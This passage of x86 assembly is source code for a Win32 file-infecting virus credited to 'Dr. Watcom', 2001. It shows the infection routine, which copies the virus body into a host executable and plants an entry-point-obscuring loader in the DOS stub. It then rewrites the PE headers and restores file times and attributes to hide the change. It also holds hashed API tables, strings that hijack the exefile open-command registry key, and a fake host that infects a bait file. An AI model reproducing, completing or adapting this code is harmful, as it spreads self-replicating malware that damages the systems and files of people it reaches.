    je    IF_CloseView

    mov   [ebp + File_SectionHeader], esi
    mov   eax, [esi.SH_VirtualAddress]
    mov   [ebp + File_SectionRVA], eax
    mov   eax, [esi.SH_PointerToRawData]
    mov   [ebp + File_SectionRaw], eax
    mov   eax, [esi.SH_SizeOfRawData]
    mov   [ebp + File_SectionSize], eax


  ; Copy virus body
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_CopyVirusBody:

    mov  edi, [ebp + File_SectionRaw]
    add  edi, [ebp + FileView]
    lea  esi, [ebp + Start]

    mov  ecx, VIRUS_SIZE
    cld
    rep  movsb

    mov  ecx, [ebp + File_SectionSize]
    sub  ecx, VIRUS_SIZE
    xor  eax, eax
    rep  stosb

  ; Insert EPO loader into DOS header/stub
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_InsertLoader:
    xor   eax, eax
    mov   edi, [ebp + FileView]        ; Start of file
    mov   [edi.MZ_ip], ax              ; Clear DOS entry point
    mov   [edi.MZ_lfarlc], ax          ; Clear DOS relocations

    add   edi, 2                       ; Skip 'MZ' signature
    mov   al, OPCODE_JMP_SHORT         ; Setup a JMP SHORT <DISP>
    stosb                              ; Insert JMP SHORT opcode
    mov   eax, size IMAGE_DOS_HEADER   ; Calc destination: after MZ header
    add   eax, 2                       ; skipping first 2 bytes of code
    sub   al,  4                       ; but relative to next EIP!
    stosb                              ; Insert displacement byte

    mov   eax, [ebp + File_ImageBase]  ; Calculate virus entry point:
    add   eax, [ebp + File_SectionRVA] ; image base + virus section RVA

    lea   edx, [ebp + EntryPoint]      ; Save virus entry point into our
    mov   [edx], eax                   ; loader code

    mov   edi, [ebp + FileView]        ; Start of file
    add   edi, size IMAGE_DOS_HEADER   ; Go beyond MZ header
    lea   esi, [ebp + EPOLoader]       ; Address of our loader code
    mov   ecx, SIZE_EPO_LOADER         ; Size of code
    rep   movsb                        ; Store it!


  ; Update headers
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_UpdateHeaders:
    mov  edi, [ebp + FileView]
    add  edi, [edi.MZ_lfanew]
    add  edi, size IMAGE_FILE_HEADER
    xor  eax, eax                      ; Clear entry point (reset to zero)
    mov  [edi.OH_AddressOfEntryPoint], eax
    
    mov  esi, [ebp + File_SectionHeader]
    mov  [esi.SH_Characteristics], \
      IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE

    mov  [ebp + FileInfected], TRUE    ; Infection complete

  ; Unmap the view
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_CloseView:
    push [ebp + FileView]
    api  UnmapViewOfFile

  ; Close the file mapping object
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_CloseMapping:
    push [ebp + FileMapping]
    api  CloseHandle

  ; Close the file handle, restore times
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_CloseFile:
IF DEBUG
    push [ebp + FileHandle]
    api  CloseHandle
ELSE
    lea  edx, [ebp + FileTime_Written]
    push edx
    lea  edx, [ebp + FileTime_Accessed]
    push edx
    lea  edx, [ebp + FileTime_Created]
    push edx
    push [ebp + FileHandle]
    api  SetFileTime

    push [ebp + FileHandle]
    api  CloseHandle
ENDIF

  ; Restore the file attributes
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_RestoreAttribs:
    push [ebp + FileAttribs]
    push [ebp + FileName]
    api  SetFileAttributes

  IF_Quit:
    popad
    ret
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ EPO - stub program                                                       บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
; Code to replace victim's DOS stub
;
EPOLoader:
           db 0Ebh                     ; jmps ...
           db MSDOS_Code-WIN32_Code    ;  (relative displacement)
  WIN32_Code:
           db 052h                     ; push edx
           db 045h                     ; inc  ebp
           db 068h                     ; push ...
    EntryPoint:
           dd 000000000h               ;
           db 033h, 0C0h               ; xor  eax, eax
           db 064h, 0FFh, 030h         ; push fs:[eax]
           db 064h, 089h, 020h         ; mov  fs:[eax], esp
           db 0F7h, 0F0h               ; div  eax
  MSDOS_Code:
           db 0BAh                     ; mov  dx ...
           dw MSDOS_String-EPOLoader   ;  (offset string)
           db 00Eh                     ; push cs
           db 01Fh                     ; pop  ds
           db 0B4h, 009h               ; mov  ah, 09
           db 0CDh, 021h               ; int  21
           db 0B8h, 001h, 04ch         ; mov  ax, 04C01
           db 0CDh, 021h               ; int  21
    MSDOS_String:
         ; db 'This program requires Microsoft Windows.'
         ; db 'This program cannot be run in DOS mode.'
         ; db 'This program must be run under Win32.'
         ; Aargh! I need more space!
           db 'This program needs Win32'
           db  CRLF, '$', 0
EPOLoader_End:
SIZE_EPO_LOADER equ EPOLoader_End - EPOLoader
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Virus Data                                                               บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
    Kernel32           dd    00h
    HostEntry          dd    00h
    CRC32              dd    00h
    Key32              dd    00h
    Count              dd    00h
    StartupInfo        dd    00h
    ProcessInfo        dd    00h
    CmdLine            dd    00h
    CmdSpawn           dd    00h
    CmdExefile         dd    00h

    RndSeed_1          dd    00h
    RndSeed_2          dd    00h
    RndSeed_3          dd    00h
    RndSeed_4          dd    00h
    RndSeed_5          dd    00h
    RndSeed_6          dd    00h

; Export table data
;-------------------------------
    ET_MaxNames        dd    00h
    ET_PtrNames        dd    00h
    ET_PtrAddresses    dd    00h
    ET_PtrOrdinals     dd    00h
    ET_TmpAddress      dd    00h

; Infection data
;-------------------------------
    FileName           dd    00h
    FileAttribs        dd    00h
    FileSize           dd    00h
    FileHandle         dd    00h
    FileMapping        dd    00h
    FileView           dd    00h
    FileTime_Created   dd    00h, 00h
    FileTime_Accessed  dd    00h, 00h
    FileTime_Written   dd    00h, 00h

    File_ImageBase     dd    00h
    File_EntryPoint    dd    00h
    File_Sections      dd    00h
    File_SectionHeader dd    00h
    File_SectionSize   dd    00h
    File_SectionRaw    dd    00h
    File_SectionRVA    dd    00h

    FileInfected       dd    00h

  Kernel_API_CRC32:
    _ExitProcess              dd        040F57181h
    _CreateProcess            dd        0267E0B05h
    _LoadLibrary              dd        04134D1ADh
    _GetProcAddress           dd        0FFC97C1Fh
    _GlobalAlloc              dd        083A353C3h
    _GetModuleFileName        dd        004DCF392h
    _GetStartupInfo           dd        052CA6A8Dh
    _GetCommandLine           dd        03921BF03h
    _GetWindowsDirectory      dd        0FE248274h
    _CloseHandle              dd        068624A9Dh
    _CreateFile               dd        08C892DDFh
    _CreateFileMapping        dd        096B2D96Ch
    _MapViewOfFile            dd        0797B49ECh
    _UnmapViewOfFile          dd        094524B42h
    _GetFileAttributes        dd        0C633D3DEh
    _SetFileAttributes        dd        03C19E536h
    _GetFileSize              dd        0EF7D811Bh
    _GetFileTime              dd        04434E8FEh
    _SetFileTime              dd        04B2A3E7Dh
    _CopyFile                 dd        05BD05DB1h
    _GetTickCount             dd        0613FD7BAh
    _GetSystemTime            dd        075B7EBE8h
    _Sleep                    dd        00AC136BAh
    _lstrcat                  dd        0C7DE8BACh
                              dd         00000000h

  Kernel_API_Addr:
    ExitProcess_              dd        0
    CreateProcess             dd        0
    LoadLibrary               dd        0
    GetProcAddress            dd        0
    GlobalAlloc               dd        0
    GetModuleFileName         dd        0
    GetStartupInfo            dd        0
    GetCommandLine            dd        0
    GetWindowsDirectory       dd        0
    CloseHandle               dd        0
    CreateFile                dd        0
    CreateFileMapping         dd        0
    MapViewOfFile             dd        0
    UnmapViewOfFile           dd        0
    GetFileAttributes         dd        0
    SetFileAttributes         dd        0
    GetFileSize               dd        0
    GetFileTime               dd        0
    SetFileTime               dd        0
    CopyFile                  dd        0
    GetTickCount              dd        0
    GetSystemTime             dd        0
    Sleep                     dd        0
    lstrcat                   dd        0

  User_API_CRC32:
    _MessageBox               dd        0D8556CF7h
    _wsprintf                 dd        0A10A30B6h
                              dd         00000000h
  User_API_Addr:
    MessageBox                dd        0
    wsprintf                  dd        0

  Advapi_API_CRC32:
    _RegOpenKeyEx             dd        0CD195699h
    _RegCloseKey              dd        0841802AFh
    _RegSetValueEx            dd        05B9EC9C6h
    _RegSetValue              dd        0E78187CEh
                              dd         00000000h

  Advapi_API_Addr:
    RegOpenKeyEx              dd        0
    RegCloseKey               dd        0
    RegSetValueEx             dd        0
    RegSetValue               dd        0

  Strings:
    szVirusName    db  VIRUS_NAME, 0
    szVirusCredits db  '[',VIRUS_NAME, '] ', VIRUS_VERSION, CRLF
                   db  '(c) 2001 by Dr. Watcom', CRLF, CRLF
                   db  'Communio gets us closer to our Dark Father', CRLF
                   db  'Come, share your vitae with me', CRLF, 0
    szUser32       db  'USER32.DLL', 0
    szAdvapi32     db  'ADVAPI32.DLL', 0
    szSfc          db  'SFC.DLL', 0
    szSfcProc      db  'SfcIsFileProtected', 0
    szRegKey       db  'exefile\shell\open\command', 0
    szRegValue     db  SPAWN_NAME, ' ', 1, '"%1" %*', 0
    szSpawnFile    db  '\', SPAWN_NAME, 0
    Padding        dd   ?
   
End:
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Host Code                                                                บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
FakeHost:

    mov  esi, offset szBait
    call InfectFile

    sub  esp, 1024
    mov  esi, esp

    push 2
    push VIRUS_SIZE
    push VIRUS_SIZE
    push offset szTemplate
    push esi
    call _wsprintfA

    push 1040h
    push offset szTitle
    push esi
    push 0
    call MessageBoxA

    add  esp, 1024

  FakeHost_Quit:
    push 0
    call ExitProcess

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
End Start
End
